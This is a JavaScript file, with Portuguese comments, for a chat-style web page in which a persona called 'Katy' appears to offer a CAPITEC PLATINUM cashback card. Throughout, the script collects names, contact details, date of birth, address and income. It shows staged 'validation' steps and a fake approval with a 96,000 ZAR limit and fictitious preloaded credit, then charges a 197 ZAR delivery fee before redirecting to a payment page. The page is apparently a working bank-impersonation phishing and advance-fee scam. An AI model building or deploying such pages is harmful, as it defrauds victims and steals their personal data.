'use strict';
const AUDIO_URL = 'assets/naomi.mp3';
const messages = document.getElementById('messages');
const composer = document.getElementById('composer');
const presence = document.getElementById('presence');
// Em ecrãs estreitos, reduz o cabeçalho e a conversa na mesma proporção (calibrado com as capturas de 517 px e de telemóvel).
function fitWidth() { document.documentElement.style.setProperty('--z', Math.min(1, document.documentElement.clientWidth / 450)); }
fitWidth(); addEventListener('resize', fitWidth);
const answers = Object.create(null); // Dados em memória até à passagem do resumo para a página de pagamento.
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
let busy = false;
function scrollEnd() { messages.scrollTop = messages.scrollHeight; }
function bubble(text, user = false) {
  const node = document.createElement('div');
  node.className = 'bubble' + (user ? ' user' : '');
  node.textContent = text;
  messages.append(node); scrollEnd(); return node;
}
// Ritmo ao estilo WhatsApp: pausa de leitura, "typing…" proporcional ao tamanho do texto e
// um intervalo curto entre mensagens seguidas, com o indicador a desaparecer e a voltar.
const jitter = (min, max) => min + Math.random() * (max - min);
let lastBot = 0;
function typingTime(text) {
  return Math.min(3800, Math.max(1100, 650 + text.length * 38)) * jitter(0.9, 1.15);
}
async function say(text) {
  const sinceLast = performance.now() - lastBot;
  // Se a mensagem anterior acabou de chegar, apenas uma pequena pausa; senão, a "Katy" lê primeiro.
  await delay(sinceLast < 600 ? jitter(350, 650) : jitter(700, 1300));
  presence.textContent = 'typing…';
  const typing = document.createElement('div'); typing.className = 'bubble typing'; typing.setAttribute('aria-label', 'Typing');
  typing.innerHTML = '<span></span><span></span><span></span>';
  messages.append(typing); scrollEnd();
  await delay(typingTime(text));
  typing.remove(); bubble(text); presence.textContent = 'online'; lastBot = performance.now();
}
const steps = [
 {key:'firstName',question:'What is your first name?',placeholder:'e.g. Maria',type:'text',max:60},
 {key:'surname',question:'And your surname?',before:()=>`Nice to meet you, ${answers.firstName}!`,placeholder:'e.g. Smith',type:'text',max:100},
 {key:'email',question:'What is your email address?',before:'Noted.',placeholder:'name@example.com',type:'email'},
 {key:'phone',question:'What is your mobile number?',before:'Great, thank you!',placeholder:'82 123 4567',type:'tel',max:11},
 {key:'birthDate',question:'What is your date of birth?',before:'Recorded.',type:'date'},
 {key:'fees',before:'Thank you!',extra:'Just 3 more quick questions before we continue.',question:'Do hidden fees on your current card hold you back?',options:['Yes, often','Sometimes','No']},
 {key:'benefits',question:'Would you like more everyday benefits?',options:['Yes','Maybe','No']},
 {key:'cashback',question:'Would you like cashback on every purchase with no annual fee?',options:['Absolutely','Maybe']},
 {key:'cashbackInterest',before:'That is exactly what CAPITEC PLATINUM is designed for.',question:'Would you like up to 5% daily cashback on your purchases in South Africa and at international shops?',options:['Yes, I want cashback','I want to learn more']},
 {key:'address',before:'Great! With CAPITEC PLATINUM, you can receive part of your purchase amount back as cashback, subject to the card’s terms.',question:'What is your address? (Street, number, suburb, city and postal code)',placeholder:'342 Main Road, Cape Town, 8001',type:'text',max:250},
 {key:'employment',before:'Address recorded.',question:'What is your employment status?',options:['Employed','Self-employed','Retired','Prefer not to say']},
 {key:'income',question:'What is your approximate monthly net income?',options:['Up to 19.000 ZAR','19.000 ZAR – 38.000 ZAR','38.000 ZAR – 75.000 ZAR','More than 75.000 ZAR']},
 {key:'goal',before:'Just 3 more quick questions.',question:'What would you do with the money you could get back from your purchases each month?',options:['💰 Increase my savings','👪 Invest in my family','🏠 Help with household expenses','✈️ Save for travel','🎯 Use it to achieve a personal goal']},
 {key:'monthlyCashback',question:'If you had a card that gave you money back on eligible purchases, how much would you like to get back each month?',options:['200 ZAR – 500 ZAR','500 ZAR – 1.000 ZAR','1.000 ZAR – 2.000 ZAR','More than 2.000 ZAR']},
 {key:'impact',question:'If your card could give you up to 5% daily cashback on your purchases with no annual fee, would it make a difference to your monthly budget?',options:['💰 Yes, a lot','👍 Yes, somewhat','🤔 Maybe']},
 {key:'improvement',question:'What would you like to improve about your finances?',options:['Save more','Get more benefits','Have more freedom','Have more control']},
 {key:'family',question:'What would you like to provide for your family? ❤️',options:['More comfort','More security','More experiences','A better future']},
 {key:'priority',question:'When choosing a card, what matters most to you?',options:['Cashback','Benefits','Freedom','Security']},
 {key:'future',question:'Imagine yourself a year from now. How would you like to feel about your finances?',options:['More at ease','More secure','More free','Better prepared']}
];
function button(label, action) {
 const b = document.createElement('button'); b.type='button'; b.className='choice'; b.textContent=label; b.addEventListener('click',action); return b;
}
function validate(step, value) {
 if (!value) return 'Please fill in this field to continue.';
 if (step.type==='email' && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) return 'Please enter a valid email address.';
 if (step.type==='tel' && !/^\d{9}$/.test(value.replace(/\D/g,''))) return 'Please enter a 9-digit mobile number.';
 if (step.type==='date') {
  const date=new Date(value+'T12:00:00'); const now=new Date();
  if (!Number.isFinite(date.getTime()) || date>now || date.getFullYear()<1900) return 'Please choose a valid date of birth.';
 }
 return '';
}
async function ask(index) {
 composer.replaceChildren(); busy=true;
 const step=steps[index];
 if (!step) { await finish(); return; }
 if (step.before) await say(typeof step.before==='function'?step.before():step.before);
 if (step.extra) await say(step.extra);
 await say(step.question); busy=false;
 if(step.options) step.options.forEach(option=>composer.append(button(option,()=>submit(index,option,option))));
 else inputControl(index,step);
 scrollEnd();
}
function inputControl(index,step) {
 const form=document.createElement('form'); form.className='input-form';
 const wrap=document.createElement('div');wrap.className='input-wrap';
 let prefix;
 if(step.type==='tel') {
  prefix=document.createElement('select');prefix.setAttribute('aria-label','Country calling code');
  [['+27','South Africa'],['+244','Angola'],['+55','Brazil'],['+258','Mozambique'],['+34','Spain'],['+33','France'],['+44','United Kingdom']].forEach(([code,country])=>{const o=document.createElement('option');o.value=code;o.textContent=code;o.title=country;prefix.append(o);}); wrap.append(prefix);
 }
 const input=document.createElement('input');input.type=step.type;input.placeholder=step.placeholder||'';input.setAttribute('aria-label',step.question);input.required=true;
 if(step.max)input.maxLength=step.max;
 // Telemóvel: só algarismos, no máximo 9 depois do indicativo, agrupados como 82 123 4567.
 if(step.type==='tel'){input.inputMode='numeric';input.addEventListener('input',()=>{let digits=input.value.replace(/\D/g,'');const code=prefix.value.slice(1);if(prefix.value==='+27'&&digits.length===10&&digits.startsWith('0'))digits=digits.slice(1);if(digits.length>9){digits=digits.replace(/^00/,'');if(digits.startsWith(code))digits=digits.slice(code.length);}input.value=digits.slice(0,9).replace(/^(\d{2})(\d{3})(\d{0,4})$/,(_,a,b,c)=>[a,b,c].filter(Boolean).join(' '));});}
 const autocomplete={firstName:'given-name',surname:'family-name',email:'email',phone:'tel-national',birthDate:'bday',address:'street-address'};input.autocomplete=autocomplete[step.key]||'off';
 if(step.type==='date'){input.min='1900-01-01';const now=new Date();input.max=[now.getFullYear(),String(now.getMonth()+1).padStart(2,'0'),String(now.getDate()).padStart(2,'0')].join('-');}
 wrap.append(input);form.append(wrap);
 const send=document.createElement('button');send.type='submit';send.className='send'+(step.type==='date'?' date-send':'');send.innerHTML=(step.type==='date'?'<span>Confirm date</span>':'')+'<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 20V4m-7 7 7-7 7 7"/></svg>';send.setAttribute('aria-label','Send reply');send.disabled=true;form.append(send);
 const error=document.createElement('p');error.className='error';error.setAttribute('role','alert');error.id='answer-error';input.setAttribute('aria-describedby',error.id);form.append(error);
 input.addEventListener('input',()=>{send.disabled=!input.value.trim();error.textContent='';input.removeAttribute('aria-invalid');});
 form.noValidate=true;
 form.addEventListener('submit',event=>{
  event.preventDefault();if(busy)return;const value=input.value.trim();const problem=validate(step,value);
  if(problem){error.textContent=problem;input.setAttribute('aria-invalid','true');return;}
  let display=value;let stored=value;
  if(step.type==='tel'){stored=prefix.value+' '+value;display=stored;}
  if(step.type==='date') display=value.split('-').reverse().join('/');
  submit(index,stored,display);
 });
 composer.append(form);
 if(step.type==='date') installCalendar(input,wrap);
 // Evita abrir o teclado automaticamente antes de o visitante tocar no campo.
}
function installCalendar(input, wrap) {
 const trigger=document.createElement('button');trigger.type='button';trigger.className='date-trigger';trigger.innerHTML='<svg viewBox="0 0 24 24"><rect x="3" y="5" width="18" height="16" rx="2"/><path d="M7 3v4m10-4v4M3 10h18"/></svg><span>Tap to choose a date</span>';
 input.hidden=true;wrap.append(trigger);
 const calendar=document.createElement('div');calendar.className='calendar';calendar.hidden=true;calendar.setAttribute('aria-label','Choose date of birth');wrap.append(calendar);
 let month=0,year=1990;
 const months=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
 function render(){
  calendar.replaceChildren();const top=document.createElement('div');top.className='calendar-top';
  const previous=button('‹',()=>{if(month===0){month=11;year--;}else month--;render();});previous.setAttribute('aria-label','Previous month');
  const next=button('›',()=>{if(month===11){month=0;year++;}else month++;render();});next.setAttribute('aria-label','Next month');
  const monthSelect=document.createElement('select');monthSelect.setAttribute('aria-label','Month');months.forEach((name,i)=>{const option=new Option(name,String(i));option.selected=i===month;monthSelect.add(option);});monthSelect.onchange=()=>{month=Number(monthSelect.value);render();};
  const yearSelect=document.createElement('select');yearSelect.setAttribute('aria-label','Year');for(let y=new Date().getFullYear();y>=1900;y--){const option=new Option(String(y),String(y));option.selected=y===year;yearSelect.add(option);}yearSelect.onchange=()=>{year=Number(yearSelect.value);render();};
  top.append(previous,monthSelect,yearSelect,next);calendar.append(top);
  const grid=document.createElement('div');grid.className='calendar-grid';['Su','Mo','Tu','We','Th','Fr','Sa'].forEach(day=>{const label=document.createElement('span');label.textContent=day;grid.append(label);});
  const offset=new Date(year,month,1).getDay();const length=new Date(year,month+1,0).getDate();
  for(let i=0;i<Math.ceil((offset+length)/7)*7;i++){
   const day=i-offset+1;const actual=new Date(year,month,day);const value=[actual.getFullYear(),String(actual.getMonth()+1).padStart(2,'0'),String(actual.getDate()).padStart(2,'0')].join('-');
   const b=document.createElement('button');b.type='button';b.textContent=actual.getDate();b.className=(day<1||day>length?'outside ':'')+(input.value===value?'selected':'');b.disabled=value>input.max||value<input.min;
   b.onclick=()=>{input.value=value;trigger.querySelector('span').textContent=value.split('-').reverse().join('/');input.dispatchEvent(new Event('input'));calendar.hidden=true;trigger.setAttribute('aria-expanded','false');};grid.append(b);
  }calendar.append(grid);
 }
 trigger.setAttribute('aria-expanded','false');trigger.onclick=()=>{calendar.hidden=!calendar.hidden;trigger.setAttribute('aria-expanded',String(!calendar.hidden));if(!calendar.hidden)render();};
 document.addEventListener('pointerdown',event=>{if(!wrap.contains(event.target)){calendar.hidden=true;trigger.setAttribute('aria-expanded','false');}});
 trigger.addEventListener('keydown',event=>{if(event.key==='Escape'){calendar.hidden=true;trigger.setAttribute('aria-expanded','false');}});
}
async function submit(index,value,display) {
 if(busy)return;busy=true;answers[steps[index].key]=value;composer.replaceChildren();bubble(display,true);await ask(index+1);
}
async function validationMessage(text) {
 const row=document.createElement('div');row.className='bubble validation';
 const status=document.createElement('span');status.className='status';status.setAttribute('aria-label','In progress');
 const label=document.createElement('span');label.textContent=text;row.append(status,label);messages.append(row);scrollEnd();
 await delay(1500);row.classList.add('done');status.textContent='✓';status.setAttribute('aria-label','Completed');scrollEnd();
}
function cardDisplayName(full) {
 const parts=String(full||'').trim().split(/\s+/).filter(Boolean);
 return parts.length>2?parts[0]+' '+parts[parts.length-1]:parts.join(' ');
}
function fitCardName(el) {
 const fit=()=>{
  el.style.fontSize='';el.style.letterSpacing='';
  const base=parseFloat(getComputedStyle(el).fontSize);let size=base;
  while(el.scrollWidth>el.clientWidth&&size>6){size-=0.5;el.style.fontSize=size+'px';if(size<base*0.85)el.style.letterSpacing='1px';if(size<base*0.65)el.style.letterSpacing='0px';}
 };
 fit();if(document.fonts)document.fonts.ready.then(fit);
 if(window.ResizeObserver)new ResizeObserver(fit).observe(el.parentElement);
}
function personalisedCard() {
 const card=document.createElement('div');card.className='card-result';
 const image=document.createElement('img');image.src='assets/nova-card.png';image.alt='Personalised card preview';
 const name=document.createElement('span');name.className='card-name';name.textContent=cardDisplayName([answers.firstName,answers.surname].filter(Boolean).join(' ')).toLocaleUpperCase('en-ZA');card.append(image,name);messages.append(card);fitCardName(name);
 const note=document.createElement('p');note.className='card-note';note.textContent='Sensitive details are hidden for security. Your physical card will be sent to the address provided.';messages.append(note);scrollEnd();
}
function shippingPreview() {
 const box=document.createElement('section');box.className='shipping';
 const title=document.createElement('h2');title.innerHTML='<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M21 8a2 2 0 0 0-1-1.7l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.7l7 4a2 2 0 0 0 2 0l7-4a2 2 0 0 0 1-1.7Z"/><path d="m3.3 7 8.7 5 8.7-5M12 22V12M7.5 4.3l9 5.1"/></svg><span>YOUR CARD DELIVERY</span>';box.append(title);
 const body=document.createElement('div');body.className='shipping-body';
 const intro=document.createElement('strong');intro.textContent='Your physical card will be sent to the address provided within 5 to 7 business days, together with all activation information.';body.append(intro);
 const dl=document.createElement('dl');
 const rowIcons={user:'<circle cx="12" cy="8" r="4"/><path d="M4 21c0-4 3.6-6 8-6s8 2 8 6"/>',card:'<rect x="2" y="5" width="20" height="14" rx="2.5"/><path d="M2 10h20M6 15h4"/>',pin:'<path d="M12 22s7-6.2 7-12a7 7 0 1 0-14 0c0 5.8 7 12 7 12Z"/><circle cx="12" cy="10" r="2.5"/>',mail:'<rect x="2" y="4" width="20" height="16" rx="2.5"/><path d="m22 7-10 6L2 7"/>'};
 [['user',`Cardholder: ${answers.firstName} ${answers.surname}`],['card','Limit: 96.000 ZAR'],['pin',`Address: ${answers.address}`],['mail',`Email confirmation: ${answers.email}`]].forEach(([icon,text])=>{const dd=document.createElement('dd');dd.innerHTML=`<svg viewBox="0 0 24 24" aria-hidden="true">${rowIcons[icon]}</svg><span></span>`;dd.lastChild.textContent=text;dl.append(dd);});body.append(dl);
 const note=document.createElement('small');note.innerHTML='<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20 13c0 5-3.5 7.5-7.7 9a1 1 0 0 1-.6 0C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.2-2.7a1.2 1.2 0 0 1 1.6 0C14.5 3.8 17 5 19 5a1 1 0 0 1 1 1Z"/><path d="m9 12 2 2 4-4"/></svg><span>Includes a PIN, guide and secure activation.</span>';body.append(note);box.append(body);messages.append(box);scrollEnd();
}
async function finish() {
 await say('Perfect. I will review your details now. One moment…');
 for(const text of ['Validating your personal details','Checking eligibility','Issuing your MASTERCARD PLATINUM card','Finalising your offer']) await validationMessage(text);
 await say(`Congratulations, ${answers.firstName}! Your application has been approved.`);
 await say('You have been assigned a limit of 96.000 ZAR. This does not constitute a credit offer.');
 await say('Generating your personalised MASTERCARD PLATINUM card…');
 await delay(1100);personalisedCard();await delay(1400);shippingPreview();
 for(const text of ['Meanwhile, here are the benefits already included:','Up to 5% daily cashback on your purchases.','No annual fee.','No fees on international payments.','Manage everything through the app, anytime.','Before finishing, you can choose an initial credit amount to be preloaded onto your card.','The amount is loaded in South African rand. You can use it from day one — choose your preferred amount:','How much would you like to have available on your card?']) await say(text);
 const options=['8.000 ZAR — repay in 1 month','18.000 ZAR — repay in 3 weeks','145.000 ZAR — repay in 6 months','201.000 ZAR — repay in 9 months','319.000 ZAR — repay in 12 months'];
 busy=false;
 composer.classList.add('credit-options');
 options.forEach(option=>composer.append(button(option,async()=>{
  if(busy)return;busy=true;answers.initialCredit=option;composer.replaceChildren();composer.classList.remove('credit-options');bubble(option,true);
  await say('Choice recorded.');
  await chooseShipping();
 })));scrollEnd();
}
// Única opção de envio durante o teste de ticket de 197 ZAR.
const shippingOptions=[
 {name:'Economy Shipping',price:'197 ZAR',days:'1 to 2 business days',minDays:1,text:'Standard delivery with basic tracking.',icon:'<path d="M3 6h11v10H3zM14 9h4l3 3v4h-7"/><circle cx="7" cy="17.5" r="1.8"/><circle cx="17" cy="17.5" r="1.8"/>'},
];
async function chooseShipping() {
 for(const text of ['All that remains is to choose shipping for your CAPITEC PLATINUM.','Economy shipping costs 197 ZAR, with delivery in 1 to 2 business days.','Confirm your shipping option below.']) await say(text);
 const list=document.createElement('div');list.className='ship-options';
 shippingOptions.forEach(option=>{
  const card=document.createElement('button');card.type='button';card.className='ship-option'+(option.recommended?' recommended':'');
  card.innerHTML=(option.recommended?'<span class="ship-badge">RECOMMENDED</span>':'')+`<span class="ship-icon"><svg viewBox="0 0 24 24" aria-hidden="true">${option.icon}</svg></span><span class="ship-body"><span class="ship-top"><strong></strong><b></b></span><span class="ship-days"><svg viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="5" width="18" height="16" rx="2"/><path d="M7 3v4m10-4v4M3 10h18"/></svg><span></span></span><span class="ship-text"></span></span>`;
  card.querySelector('strong').textContent=option.name;card.querySelector('b').textContent=option.price;card.querySelector('.ship-days>span').textContent=option.days;card.querySelector('.ship-text').textContent=option.text;
  card.addEventListener('click',async()=>{
   if(busy)return;busy=true;answers.shipping=option.name;composer.replaceChildren();composer.classList.remove('ship-mode');bubble(`${option.name} — ${option.price} (${option.days})`,true);
   await say(`Great! ${option.name} confirmed — delivery in ${option.days}.`);
   await chooseDeliveryDate(option);
  });
  list.append(card);
 });
 composer.classList.add('ship-mode');composer.append(list);busy=false;scrollEnd();
}
const display=date=>[String(date.getDate()).padStart(2,'0'),String(date.getMonth()+1).padStart(2,'0'),date.getFullYear()].join('/');
const isoDate=date=>[date.getFullYear(),String(date.getMonth()+1).padStart(2,'0'),String(date.getDate()).padStart(2,'0')].join('-');
const svgIcon=(paths,cls='')=>`<svg${cls?` class="${cls}"`:''} viewBox="0 0 24 24" aria-hidden="true">${paths}</svg>`;
const icons={
 calendar:'<rect x="3" y="5" width="18" height="16" rx="2"/><path d="M7 3v4m10-4v4M3 10h18"/>',
 pencil:'<path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4Z"/>',
 shield:'<path d="M20 13c0 5-3.5 7.5-7.7 9a1 1 0 0 1-.6 0C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.2-2.7a1.2 1.2 0 0 1 1.6 0C14.5 3.8 17 5 19 5a1 1 0 0 1 1 1Z"/><path d="m9 12 2 2 4-4"/>',
 badge:'<path d="M12 2.5l2.4 1.7 2.9-.1.9 2.8 2.3 1.8-.9 2.8.9 2.8-2.3 1.8-.9 2.8-2.9-.1L12 21.5l-2.4-1.7-2.9.1-.9-2.8-2.3-1.8.9-2.8-.9-2.8 2.3-1.8.9-2.8 2.9.1Z"/><path d="m9 12 2 2 4-4"/>',
 box:'<path d="M21 8a2 2 0 0 0-1-1.7l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.7l7 4a2 2 0 0 0 2 0l7-4a2 2 0 0 0 1-1.7Z"/><path d="m3.3 7 8.7 5 8.7-5M12 22V12M7.5 4.3l9 5.1"/>',
 pin:'<path d="M12 22s7-6.2 7-12a7 7 0 1 0-14 0c0 5.8 7 12 7 12Z"/><circle cx="12" cy="10" r="2.5"/>'
};
// Última etapa: entrega agendada, resumo do envio e confirmação do pedido.
async function confirmOrder(option, date) {
 await say(`Great! Let’s schedule delivery for ${display(date)}.`);
 const card=document.createElement('section');card.className='scheduled';
 card.innerHTML=`<h3>${svgIcon(icons.calendar)}<span>DELIVERY SCHEDULED</span></h3><strong></strong><p>You will be at home on this date to receive your card.</p><button type="button">${svgIcon(icons.pencil)}<span>Change delivery date</span></button>`;
 card.querySelector('strong').textContent=display(date);
 const change=card.querySelector('button');
 messages.append(card);scrollEnd();
 await say('Everything is ready on my side.');
 await say('Simply confirm your order to receive the card at your address.');
 const kind=option.name.toLowerCase();
 const order=document.createElement('div');order.className='order';
 order.innerHTML=`<p class="order-fee">${svgIcon(icons.shield)}<span></span></p><section class="order-summary"><h3>${svgIcon(icons.box)}<span></span></h3><ul></ul></section><button type="button" class="order-confirm">Confirm order</button>`;
 order.querySelector('.order-fee span').textContent=`One-time fee of ${option.price} — ${kind}.`;
 order.querySelector('.order-summary h3 span').textContent=`${kind.toUpperCase()} SUMMARY`;
 [[icons.calendar,'Scheduled date:',display(date)],[icons.shield,'Estimated delivery:',`${option.days}, with registered and tracked shipping.`],[icons.badge,'Includes:','physical card, PIN and activation guide.'],[icons.pin,'Address:',answers.address||'']].forEach(([icon,label,text])=>{
  const li=document.createElement('li');li.innerHTML=`${svgIcon(icon)}<span><b></b> </span>`;li.querySelector('b').textContent=label;li.lastChild.append(text);order.querySelector('ul').append(li);
 });
 change.onclick=async()=>{
  if(busy)return;busy=true;change.disabled=true;composer.replaceChildren();composer.classList.remove('order-mode');
  await chooseDeliveryDate(option,true);
 };
 order.querySelector('.order-confirm').onclick=async()=>{
  if(busy)return;busy=true;change.disabled=true;answers.order='confirmado';composer.replaceChildren();composer.classList.remove('order-mode');bubble('Confirm order',true);
  const order={
   name:[answers.firstName,answers.surname].filter(Boolean).join(' '),
   address:answers.address,deliveryDate:answers.deliveryDate,
   shipping:option.name,shippingPrice:option.price,shippingDays:option.days,
   credit:answers.initialCredit ? answers.initialCredit.split(' — ')[0] : ''
  };
  try { sessionStorage.setItem('novaCardOrder',JSON.stringify(order)); } catch (_) {}
  window.location.assign('pagamento.html'+window.location.search);
 };
 composer.classList.add('order-mode');composer.append(order);busy=false;scrollEnd();
}
// Fase final: agendamento da entrega num calendário (datas a partir do prazo mínimo do envio escolhido).
async function chooseDeliveryDate(option, again=false) {
 if(!again) for(const text of ['To ensure your card can be delivered, choose a date when you will be at home to receive it.','Delivery follows the timeframe for your chosen shipping method. You can choose a date in the coming weeks.']) await say(text);
 const today=new Date();today.setHours(0,0,0,0);
 const first=new Date(today);first.setDate(first.getDate()+option.minDays);
 const last=new Date(today);last.setDate(last.getDate()+70);
 const sameDay=(a,b)=>a&&b&&a.toDateString()===b.toDateString();
 let chosen=null,view=new Date(first.getFullYear(),first.getMonth(),1);
 const box=document.createElement('div');box.className='delivery';
 const trigger=document.createElement('button');trigger.type='button';trigger.className='delivery-trigger';trigger.setAttribute('aria-expanded','false');
 trigger.innerHTML='<svg viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="5" width="18" height="16" rx="2"/><path d="M7 3v4m10-4v4M3 10h18"/></svg><span>Tap to choose a delivery date</span>';
 const calendar=document.createElement('div');calendar.className='delivery-calendar';calendar.hidden=true;calendar.setAttribute('aria-label','Choose delivery date');
 const confirm=document.createElement('button');confirm.type='button';confirm.className='delivery-confirm';confirm.disabled=true;
 confirm.innerHTML='<span>Confirm schedule</span><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 20V4m-7 7 7-7 7 7"/></svg>';
 const close=()=>{calendar.hidden=true;trigger.setAttribute('aria-expanded','false');};
 function render(){
  calendar.replaceChildren();
  const top=document.createElement('div');top.className='delivery-top';
  const month=view.toLocaleString('en-ZA',{month:'long'})+' '+view.getFullYear();
  const previous=button('‹',()=>{if(view<=new Date(today.getFullYear(),today.getMonth(),1))return;view=new Date(view.getFullYear(),view.getMonth()-1,1);render();});previous.setAttribute('aria-label','Previous month');
  const next=button('›',()=>{view=new Date(view.getFullYear(),view.getMonth()+1,1);render();});next.setAttribute('aria-label','Next month');
  // A seta '‹' mantém o aspecto activo (como na captura), mas não recua antes do mês actual.
  next.disabled=view>=new Date(last.getFullYear(),last.getMonth(),1);
  const label=document.createElement('strong');label.textContent=month;top.append(previous,label,next);calendar.append(top);
  const grid=document.createElement('div');grid.className='delivery-grid';
  ['Su','Mo','Tu','We','Th','Fr','Sa'].forEach(day=>{const span=document.createElement('span');span.textContent=day;grid.append(span);});
  const offset=view.getDay();const length=new Date(view.getFullYear(),view.getMonth()+1,0).getDate();
  for(let i=0;i<Math.ceil((offset+length)/7)*7;i++){
   const date=new Date(view.getFullYear(),view.getMonth(),i-offset+1);
   const b=document.createElement('button');b.type='button';b.textContent=date.getDate();
   b.disabled=date<first||date>last;
   b.className=(sameDay(date,today)?'today ':'')+(sameDay(date,chosen)?'selected':'');
   b.setAttribute('aria-label',display(date));
   b.onclick=()=>{chosen=date;trigger.querySelector('span').textContent=display(date);trigger.classList.add('filled');confirm.disabled=false;close();};
   grid.append(b);
  }
  calendar.append(grid);
 }
 trigger.onclick=()=>{calendar.hidden=!calendar.hidden;trigger.setAttribute('aria-expanded',String(!calendar.hidden));if(!calendar.hidden)render();};
 const outside=event=>{if(!box.contains(event.target))close();};document.addEventListener('pointerdown',outside);
 calendar.addEventListener('keydown',event=>{if(event.key==='Escape'){close();trigger.focus();}});
 confirm.onclick=async()=>{
  if(busy||!chosen)return;busy=true;answers.deliveryDate=display(chosen);document.removeEventListener('pointerdown',outside);
  composer.replaceChildren();composer.classList.remove('delivery-mode');bubble(isoDate(chosen),true);
  await confirmOrder(option,chosen);
 };
 box.append(calendar,trigger,confirm);composer.classList.add('delivery-mode');composer.append(box);busy=false;scrollEnd();
}
function audioBubble() {
 const row=document.createElement('div');row.className='bubble audio';
 const play=document.createElement('button');play.innerHTML='<svg viewBox="0 0 24 24"><path d="m8 4 12 8-12 8Z"/></svg>';play.setAttribute('aria-label',AUDIO_URL?'Play audio':'Audio not yet available');
 const center=document.createElement('div');center.className='audio-center';center.innerHTML='<div class="audio-track"></div><div class="audio-info"><span class="audio-time">0:00</span><span>Audio</span></div>';
 const avatar=document.createElement('img');avatar.src='assets/katy-audio-avatar-2x.png';avatar.alt='Katy';row.append(play,center,avatar);messages.append(row);
 if(AUDIO_URL){
  const audio=new Audio(AUDIO_URL);audio.preload='auto';
  const time=center.querySelector('.audio-time');const track=center.querySelector('.audio-track');
  const fill=document.createElement('div');fill.className='audio-progress';track.append(fill);
  const formatTime=seconds=>Math.floor(seconds/60)+':'+String(Math.floor(seconds%60)).padStart(2,'0');
  const pauseIcon='<svg viewBox="0 0 24 24"><path d="M7 4h4v16H7zM13 4h4v16h-4z"/></svg>';const playIcon=play.innerHTML;
  // Mostra a contagem: tempo decorrido durante a reprodução e barra de progresso.
  const update=()=>{const d=audio.duration;time.textContent=formatTime(audio.currentTime);fill.style.width=Number.isFinite(d)&&d>0?(audio.currentTime/d*100)+'%':'0%';};
  audio.addEventListener('loadedmetadata',()=>{if(Number.isFinite(audio.duration)&&audio.paused)time.textContent=formatTime(audio.duration);});
  audio.addEventListener('timeupdate',update);
  audio.addEventListener('play',()=>{play.innerHTML=pauseIcon;play.setAttribute('aria-label','Pause audio');});
  audio.addEventListener('pause',()=>{play.innerHTML=playIcon;play.setAttribute('aria-label','Play audio');});
  audio.addEventListener('ended',()=>{fill.style.width='100%';if(Number.isFinite(audio.duration))time.textContent=formatTime(audio.duration);});
  play.addEventListener('click',()=>{if(audio.paused)audio.play().catch(()=>{});else audio.pause();});
  track.addEventListener('click',e=>{if(!Number.isFinite(audio.duration))return;const r=track.getBoundingClientRect();audio.currentTime=Math.max(0,Math.min(1,(e.clientX-r.left)/r.width))*audio.duration;update();});
  // Reprodução automática; se o navegador bloquear, começa no primeiro toque/tecla do utilizador.
  const events=['pointerdown','touchstart','keydown'];
  const unlock=e=>{events.forEach(t=>document.removeEventListener(t,unlock,true));if(play.contains(e.target))return;if(audio.paused&&!audio.ended&&audio.currentTime===0)audio.play().catch(()=>{});};
  audio.play().catch(()=>events.forEach(t=>document.addEventListener(t,unlock,true)));
 }
 else play.addEventListener('click',()=>{if(!row.querySelector('.audio-pending')){const note=document.createElement('small');note.className='audio-pending';note.textContent='Audio not yet available.';center.append(note);scrollEnd();}});
 scrollEnd();
}
async function start() {
 await say('Hello! Listen to this quick audio message:');
 // Como no WhatsApp: pequena pausa, "recording audio…" no topo e só depois chega o áudio.
 await delay(jitter(600, 900));presence.textContent='recording audio…';await delay(jitter(2200, 2800));
 audioBubble();presence.textContent='online';await delay(jitter(1500, 2200));lastBot=0;
 await say('Quick preliminary assessment — 2 minutes. Shall we begin?');
 composer.append(button('Start',async()=>{if(busy)return;busy=true;composer.replaceChildren();bubble('Start',true);await ask(0);}));
}
start();
